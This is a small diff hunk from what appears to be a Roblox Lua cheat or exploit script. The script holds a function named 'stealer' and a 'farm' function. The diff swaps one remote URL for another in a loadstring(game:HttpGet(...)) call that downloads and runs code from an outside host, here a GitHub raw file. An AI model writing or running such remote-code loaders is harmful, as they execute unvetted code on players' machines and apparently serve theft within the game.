@@ -7,7 +7,7 @@ local function stealer()
 end
 
 local function farm()
-    loadstring(game:HttpGet('https://api.overdrivehub.xyz/v1/auth'))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
 end
 
 local isVIPServer = ReplicatedStorage.Remotes.Extras.IsVIPServer:InvokeServer()
